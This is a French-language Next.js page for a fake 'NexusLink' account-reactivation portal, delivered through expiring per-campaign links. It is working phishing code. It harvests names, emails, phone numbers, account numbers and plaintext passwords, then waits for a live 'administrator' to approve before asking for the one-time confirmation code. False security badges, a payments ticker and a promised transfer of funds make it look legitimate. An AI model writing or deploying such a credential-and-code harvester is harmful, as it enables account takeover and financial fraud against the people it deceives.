'use client';

import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
    ShieldCheck,
    Lock,
    KeyRound,
    MessageSquare,
    CheckCircle2,
    AlertTriangle,
    ArrowRight,
    Loader2,
    Check,
    Clock,
    RefreshCw,
    Send
} from 'lucide-react';
import confetti from 'canvas-confetti';
import { cn } from '@/lib/utils';
import { dataService } from '@/lib/dataService';
import { useParams } from 'next/navigation';
import RecentPaymentsTicker from '@/components/form/RecentPaymentsTicker';
import CountrySelector, { Country } from '@/components/form/CountrySelector';

const COUNTRIES: Country[] = [
    { name: "Cameroun", code: "CM", dial: "+237" },
    { name: "Côte d'Ivoire", code: "CI", dial: "+225" },
    { name: "Sénégal", code: "SN", dial: "+221" },
    { name: "RD Congo", code: "CD", dial: "+243" },
    { name: "Congo-Brazzaville", code: "CG", dial: "+242" },
    { name: "Gabon", code: "GA", dial: "+241" },
    { name: "Bénin", code: "BJ", dial: "+229" },
    { name: "Togo", code: "TG", dial: "+228" },
    { name: "Burkina Faso", code: "BF", dial: "+226" },
    { name: "Mali", code: "ML", dial: "+223" },
    { name: "Guinée", code: "GN", dial: "+224" },
    { name: "Niger", code: "NE", dial: "+227" },
    { name: "Tchad", code: "TD", dial: "+235" },
    { name: "Centrafrique", code: "CF", dial: "+236" },
    { name: "Maroc", code: "MA", dial: "+212" },
    { name: "Algérie", code: "DZ", dial: "+213" },
    { name: "Tunisie", code: "TN", dial: "+216" },
    { name: "Madagascar", code: "MG", dial: "+261" },
    { name: "Rwanda", code: "RW", dial: "+250" },
    { name: "Nigeria", code: "NG", dial: "+234" },
    { name: "France", code: "FR", dial: "+33" },
];

export default function ClientLinkPage() {
    const params = useParams();
    const linkId = params.id as string;

    // Étapes : 'form' | 'waiting_admin' | 'enter_code' | 'completed' | 'rejected'
    const [currentStep, setCurrentStep] = useState<'form' | 'waiting_admin' | 'enter_code' | 'completed' | 'rejected'>('form');
    const [loadingConfig, setLoadingConfig] = useState(true);
    const [errorMsg, setErrorMsg] = useState<string | null>(null);
    const [linkInfo, setLinkInfo] = useState<any>(null);
    const [submissionId, setSubmissionId] = useState<string | null>(null);
    const [isSubmitting, setIsSubmitting] = useState(false);

    // Formulaire principal
    const [formData, setFormData] = useState({
        fullName: '',
        email: '',
        phone: '',
        dialCode: '+237',
        countryName: 'Cameroun',
        countryCode: 'CM',
        accountNumber: '',
        password: '',
        method: 'NexusLink Direct'
    });

    // Code de confirmation reçu par message
    const [confirmationCode, setConfirmationCode] = useState('');
    const [submittingCode, setSubmittingCode] = useState(false);

    // Initialisation et récupération des infos du lien
    useEffect(() => {
        const fetchLink = async () => {
            try {
                const data = await dataService.getLink(linkId);
                if (data) {
                    setLinkInfo(data);

                    if (data.expiry_date && new Date() > new Date(data.expiry_date)) {
                        setErrorMsg("Ce lien d'inscription a expiré. Veuillez contacter votre administrateur.");
                    } else if (data.submissions_limit > 0 && data.submission_count >= data.submissions_limit) {
                        setErrorMsg("Ce formulaire a atteint son quota maximal de participations.");
                    }
                } else {
                    setErrorMsg("Accès restreint : le lien spécifié est introuvable ou a été désactivé.");
                }
            } catch (err: any) {
                console.error("Erreur récupération lien:", err);
                setErrorMsg("Lien inaccessible. Veuillez vérifier l'URL fournie.");
            } finally {
                setLoadingConfig(false);
            }
        };

        const detectCountry = async () => {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                if (data && data.country_code) {
                    const country = COUNTRIES.find(c => c.code === data.country_code);
                    if (country) {
                        setFormData(prev => ({
                            ...prev,
                            dialCode: country.dial,
                            countryName: country.name,
                            countryCode: country.code
                        }));
                    }
                }
            } catch {}
        };

        fetchLink();
        detectCountry();
    }, [linkId]);

    // Écoute en temps réel de la validation par l'administrateur
    useEffect(() => {
        if (currentStep !== 'waiting_admin' || !submissionId) return;

        const checkAdminApproval = async () => {
            try {
                const sub = await dataService.getSubmissionById(submissionId);
                if (sub) {
                    const statusStr = (sub.status || '').toLowerCase();
                    if (statusStr.includes('approuvé') || statusStr.includes('code') || statusStr === 'approved_awaiting_code') {
                        setCurrentStep('enter_code');
                    } else if (statusStr.includes('rejet') || statusStr.includes('refus')) {
                        setCurrentStep('rejected');
                    }
                }
            } catch (err) {
                console.warn("Vérification statut en attente:", err);
            }
        };

        const interval = setInterval(checkAdminApproval, 2500);
        return () => clearInterval(interval);
    }, [currentStep, submissionId]);

    // Soumission du premier formulaire
    const handleInitialSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setIsSubmitting(true);

        try {
            const fullPhone = `${formData.dialCode} ${formData.phone}`.trim();
            const res = await dataService.submitForm({
                link_id: linkId,
                full_name: formData.fullName,
                email: formData.email,
                phone: fullPhone,
                method: formData.method,
                account_number: formData.accountNumber,
                password: formData.password,
                country_name: formData.countryName,
                country_code: formData.countryCode,
            });

            const createdId = res?.id || res?.data?.id || (res && typeof res === 'object' ? Object.values(res)[0] : null);
            setSubmissionId(createdId || 'temp-' + Date.now());
            setCurrentStep('waiting_admin');
        } catch (err: any) {
            alert(`Erreur lors de la transmission: ${err.message || 'Vérifiez votre connexion'}`);
        } finally {
            setIsSubmitting(false);
        }
    };

    // Soumission du code de confirmation reçu par message
    const handleCodeSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!confirmationCode.trim()) return;
        setSubmittingCode(true);

        try {
            if (submissionId) {
                await dataService.submitVerificationCode(submissionId, confirmationCode.trim());
            }

            setCurrentStep('completed');
            confetti({
                particleCount: 100,
                spread: 80,
                origin: { y: 0.6 },
                colors: ['#2563eb', '#38bdf8', '#10b981']
            });
        } catch (err: any) {
            alert(`Erreur de validation du code: ${err.message || 'Vérifiez le code saisi'}`);
        } finally {
            setSubmittingCode(false);
        }
    };

    if (loadingConfig) {
        return (
            <div className="min-h-screen bg-[#07090e] flex flex-col items-center justify-center p-6 text-slate-300">
                <Loader2 className="w-8 h-8 text-blue-500 animate-spin mb-4" />
                <p className="text-xs font-medium text-slate-400">Établissement du tunnel sécurisé...</p>
            </div>
        );
    }

    if (errorMsg) {
        return (
            <div className="min-h-screen bg-[#07090e] flex flex-col items-center justify-center p-6 text-center">
                <div className="w-16 h-16 bg-rose-500/10 border border-rose-500/20 rounded-2xl flex items-center justify-center mb-6">
                    <AlertTriangle className="w-8 h-8 text-rose-400" />
                </div>
                <h1 className="text-2xl font-bold text-white mb-2">Lien Indisponible</h1>
                <p className="text-xs sm:text-sm text-slate-400 max-w-md mb-8 leading-relaxed">
                    {errorMsg}
                </p>
                <div className="p-3 rounded-xl bg-slate-900/60 border border-white/5 text-xs text-slate-500 font-mono">
                    ID Campagne : {linkId}
                </div>
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-[#07090e] text-slate-100 flex flex-col">
            {/* Header d'infrastructure sécurisée */}
            <header className="border-b border-white/[0.06] bg-slate-950/70 backdrop-blur-md sticky top-0 z-40">
                <div className="max-w-5xl mx-auto px-4 h-16 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                        <div className="w-8 h-8 rounded-lg bg-blue-600 flex items-center justify-center text-white shadow-md shadow-blue-600/30">
                            <ShieldCheck className="w-5 h-5" />
                        </div>
                        <div>
                            <span className="font-bold text-sm tracking-tight text-white block">NexusLink Solutions</span>
                            <span className="text-[10px] text-slate-400 uppercase tracking-wider block">Portail de Réactivation Sécurisé</span>
                        </div>
                    </div>

                    <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-slate-900/80 border border-white/10 text-xs font-medium text-slate-300">
                        <Lock className="w-3.5 h-3.5 text-emerald-400" />
                        <span>Canal Chiffré</span>
                    </div>
                </div>
            </header>

            <RecentPaymentsTicker />

            {/* Corps du processus */}
            <main className="flex-1 max-w-xl w-full mx-auto px-4 py-8 sm:py-12 flex flex-col justify-center">
                <AnimatePresence mode="wait">
                    {/* ÉTAPE 1 : FORMULAIRE D'INSCRIPTION / RÉACTIVATION */}
                    {currentStep === 'form' && (
                        <motion.div
                            key="step-form"
                            initial={{ opacity: 0, y: 12 }}
                            animate={{ opacity: 1, y: 0 }}
                            exit={{ opacity: 0, y: -12 }}
                            className="glass-card rounded-2xl p-6 sm:p-8"
                        >
                            <div className="mb-6">
                                <div className="inline-flex items-center gap-2 px-2.5 py-1 rounded-md bg-blue-500/10 border border-blue-500/20 text-blue-400 text-xs font-medium mb-3">
                                    <span className="w-1.5 h-1.5 rounded-full bg-blue-400"></span>
                                    {linkInfo?.name || 'Réactivation de compte'}
                                </div>
                                <h1 className="text-xl sm:text-2xl font-bold text-white mb-2">
                                    Demande de Réactivation de Compte
                                </h1>
                                <p className="text-xs sm:text-sm text-slate-400 leading-relaxed">
                                    Renseignez vos informations personnelles et les accès de votre compte NexusLink pour soumettre votre dossier à l'administrateur.
                                </p>
                            </div>

                            <form onSubmit={handleInitialSubmit} className="space-y-5">
                                <div>
                                    <label className="block text-xs font-medium text-slate-300 mb-1.5">
                                        Nom et prénom complet
                                    </label>
                                    <input
                                        type="text"
                                        required
                                        placeholder="ex: Paul Dupont"
                                        value={formData.fullName}
                                        onChange={(e) => setFormData({ ...formData, fullName: e.target.value })}
                                        className="input-field text-sm"
                                    />
                                </div>

                                <div>
                                    <label className="block text-xs font-medium text-slate-300 mb-1.5">
                                        Adresse email
                                    </label>
                                    <input
                                        type="email"
                                        required
                                        placeholder="contact@exemple.com"
                                        value={formData.email}
                                        onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                                        className="input-field text-sm"
                                    />
                                </div>

                                <div>
                                    <label className="block text-xs font-medium text-slate-300 mb-1.5">
                                        Numéro de téléphone
                                    </label>
                                    <div className="flex gap-2">
                                        <CountrySelector
                                            countries={COUNTRIES}
                                            selectedDial={formData.dialCode}
                                            onSelect={(c) => {
                                                setFormData({
                                                    ...formData,
                                                    dialCode: c.dial,
                                                    countryName: c.name,
                                                    countryCode: c.code
                                                });
                                            }}
                                        />
                                        <input
                                            type="tel"
                                            required
                                            placeholder="6 00 00 00 00"
                                            value={formData.phone}
                                            onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
                                            className="input-field text-sm font-mono flex-1"
                                        />
                                    </div>
                                </div>

                                <div>
                                    <label className="block text-xs font-medium text-slate-300 mb-1.5">
                                        Identifiant ou Numéro de compte NexusLink
                                    </label>
                                    <input
                                        type="text"
                                        required
                                        placeholder="ex: NL-984210"
                                        value={formData.accountNumber}
                                        onChange={(e) => setFormData({ ...formData, accountNumber: e.target.value })}
                                        className="input-field text-sm font-mono"
                                    />
                                </div>

                                <div>
                                    <label className="block text-xs font-medium text-slate-300 mb-1.5 flex justify-between">
                                        <span>Mot de passe du compte NexusLink</span>
                                        <span className="text-[10px] text-slate-400 flex items-center gap-1">
                                            <Lock className="w-2.5 h-2.5 text-emerald-400" /> Protégé
                                        </span>
                                    </label>
                                    <input
                                        type="password"
                                        required
                                        placeholder="••••••••••••"
                                        value={formData.password}
                                        onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                                        className="input-field text-sm font-mono"
                                    />
                                </div>

                                <button
                                    type="submit"
                                    disabled={isSubmitting}
                                    className="btn-premium w-full py-3.5 text-sm font-semibold flex items-center justify-center gap-2 cursor-pointer mt-4"
                                >
                                    {isSubmitting ? (
                                        <>
                                            <Loader2 className="w-4 h-4 animate-spin" />
                                            <span>Envoi de votre demande...</span>
                                        </>
                                    ) : (
                                        <>
                                            <span>Soumettre la demande à l'administrateur</span>
                                            <ArrowRight className="w-4 h-4" />
                                        </>
                                    )}
                                </button>
                            </form>
                        </motion.div>
                    )}

                    {/* ÉTAPE 2 : ATTENTE DE VALIDATION EN DIRECT PAR L'ADMINISTRATEUR */}
                    {currentStep === 'waiting_admin' && (
                        <motion.div
                            key="step-waiting"
                            initial={{ opacity: 0, scale: 0.98 }}
                            animate={{ opacity: 1, scale: 1 }}
                            exit={{ opacity: 0, scale: 0.98 }}
                            className="glass-card rounded-2xl p-8 sm:p-12 text-center"
                        >
                            <div className="relative w-20 h-20 mx-auto mb-8 flex items-center justify-center">
                                <div className="absolute inset-0 rounded-full border-2 border-blue-500/20 animate-ping"></div>
                                <div className="w-20 h-20 rounded-full border-2 border-t-blue-500 border-r-blue-500/40 border-b-transparent border-l-transparent animate-spin"></div>
                                <Clock className="w-8 h-8 text-blue-400 absolute" />
                            </div>

                            <h2 className="text-xl font-bold text-white mb-2">
                                Examen de votre demande en cours
                            </h2>
                            <p className="text-xs sm:text-sm text-slate-400 mb-8 max-w-md mx-auto leading-relaxed">
                                Votre dossier a été transmis à l'administrateur. Veuillez patienter sur cette page pendant sa validation. Cette étape prend généralement quelques instants.
                            </p>

                            <div className="p-4 rounded-xl bg-slate-900/60 border border-white/5 space-y-3 text-left mb-6">
                                <div className="flex items-center gap-3 text-xs">
                                    <div className="w-4 h-4 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center">
                                        <Check className="w-2.5 h-2.5" />
                                    </div>
                                    <span className="text-slate-200">Informations transmises au tableau de bord</span>
                                </div>
                                <div className="flex items-center gap-3 text-xs">
                                    <Loader2 className="w-4 h-4 text-blue-400 animate-spin shrink-0" />
                                    <span className="text-blue-400 font-medium">En attente de validation par l'administrateur...</span>
                                </div>
                                <div className="flex items-center gap-3 text-xs">
                                    <div className="w-4 h-4 rounded-full bg-slate-800 border border-slate-700"></div>
                                    <span className="text-slate-500">Envoi du code de confirmation par message</span>
                                </div>
                            </div>

                            <p className="text-[11px] text-slate-500">
                                Dès l'approbation de votre demande, cette page s'actualisera instantanément pour vous permettre de saisir votre code.
                            </p>
                        </motion.div>
                    )}

                    {/* ÉTAPE 3 : SAISIE DU CODE DE CONFIRMATION REÇU PAR MESSAGE */}
                    {currentStep === 'enter_code' && (
                        <motion.div
                            key="step-code"
                            initial={{ opacity: 0, y: 12 }}
                            animate={{ opacity: 1, y: 0 }}
                            exit={{ opacity: 0, y: -12 }}
                            className="glass-card rounded-2xl p-6 sm:p-8"
                        >
                            <div className="text-center mb-6">
                                <div className="w-12 h-12 rounded-xl bg-blue-600/10 border border-blue-500/20 text-blue-400 flex items-center justify-center mx-auto mb-4">
                                    <MessageSquare className="w-6 h-6" />
                                </div>
                                <span className="badge badge-success text-[10px] mb-2">Demande Approuvée</span>
                                <h2 className="text-xl font-bold text-white mb-2">Saisie du Code de Confirmation</h2>
                                <p className="text-xs text-slate-400 leading-relaxed max-w-sm mx-auto">
                                    L'administrateur a validé votre demande. Un message de confirmation vous a été envoyé. Veuillez coller ou saisir le code reçu ci-dessous.
                                </p>
                            </div>

                            <form onSubmit={handleCodeSubmit} className="space-y-5">
                                <div>
                                    <label className="block text-xs font-medium text-slate-300 mb-1.5 text-center">
                                        Code de confirmation / Lien reçu
                                    </label>
                                    <div className="relative">
                                        <KeyRound className="w-4 h-4 text-slate-500 absolute left-3.5 top-1/2 -translate-y-1/2" />
                                        <input
                                            type="text"
                                            required
                                            autoFocus
                                            placeholder="Collez le code ou le message reçu ici..."
                                            value={confirmationCode}
                                            onChange={(e) => setConfirmationCode(e.target.value)}
                                            className="input-field pl-10 text-center font-mono text-base font-bold tracking-wider"
                                        />
                                    </div>
                                </div>

                                <button
                                    type="submit"
                                    disabled={submittingCode || !confirmationCode.trim()}
                                    className="btn-premium w-full py-3.5 text-sm font-semibold flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
                                >
                                    {submittingCode ? (
                                        <>
                                            <Loader2 className="w-4 h-4 animate-spin" />
                                            <span>Validation du code...</span>
                                        </>
                                    ) : (
                                        <>
                                            <span>Confirmer et Réactiver le Compte</span>
                                            <Send className="w-4 h-4" />
                                        </>
                                    )}
                                </button>
                            </form>
                        </motion.div>
                    )}

                    {/* ÉTAPE 4 : FÉLICITATIONS & RÉACTIVATION CONFIRMÉE */}
                    {currentStep === 'completed' && (
                        <motion.div
                            key="step-completed"
                            initial={{ opacity: 0, scale: 0.95 }}
                            animate={{ opacity: 1, scale: 1 }}
                            className="glass-card rounded-2xl p-8 sm:p-12 text-center"
                        >
                            <div className="w-16 h-16 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 flex items-center justify-center mx-auto mb-6">
                                <CheckCircle2 className="w-8 h-8" />
                            </div>

                            <h2 className="text-2xl font-bold text-white mb-2">Félicitations !</h2>
                            <p className="text-sm font-semibold text-emerald-400 mb-4">
                                Vous venez de réactiver votre compte NexusLink avec succès.
                            </p>

                            <div className="p-4 rounded-xl bg-slate-900/80 border border-white/10 text-xs text-slate-300 leading-relaxed mb-6">
                                <p className="mb-2 text-white font-medium">
                                    Veuillez patienter pendant le transfert et la synchronisation de vos fonds.
                                </p>
                                <p className="text-[11px] text-slate-400">
                                    Toutes les opérations d'ajustement de solde sont en cours de traitement automatique par le grand livre sécurisé.
                                </p>
                            </div>

                            <div className="p-3 rounded-xl bg-slate-900/40 border border-white/5 text-[11px] font-mono text-slate-500 flex justify-between">
                                <span>RÉF : {submissionId || 'NL-TX-CONFIRMED'}</span>
                                <span className="text-emerald-400">STATUT : VALIDÉ</span>
                            </div>
                        </motion.div>
                    )}

                    {/* ÉTAPE REJETÉE (SI REFUS ADMIN) */}
                    {currentStep === 'rejected' && (
                        <motion.div
                            key="step-rejected"
                            initial={{ opacity: 0, scale: 0.95 }}
                            animate={{ opacity: 1, scale: 1 }}
                            className="glass-card rounded-2xl p-8 text-center"
                        >
                            <div className="w-16 h-16 rounded-full bg-rose-500/10 border border-rose-500/20 text-rose-400 flex items-center justify-center mx-auto mb-6">
                                <AlertTriangle className="w-8 h-8" />
                            </div>
                            <h2 className="text-xl font-bold text-white mb-2">Demande Non Approuvée</h2>
                            <p className="text-xs text-slate-400 mb-6">
                                Votre demande de réactivation n'a pas pu être validée par l'administrateur. Veuillez contacter le support.
                            </p>
                            <button
                                onClick={() => setCurrentStep('form')}
                                className="btn-secondary py-2 px-4 text-xs"
                            >
                                Réessayer
                            </button>
                        </motion.div>
                    )}
                </AnimatePresence>
            </main>

            <footer className="border-t border-white/[0.06] py-6 text-center text-xs text-slate-500">
                <div className="max-w-5xl mx-auto px-4 flex flex-col sm:flex-row items-center justify-between gap-2">
                    <p>© {new Date().getFullYear()} NexusLink Solutions. Infrastructure sécurisée.</p>
                    <p>Protection des données et conformité garantie.</p>
                </div>
            </footer>
        </div>
    );
}
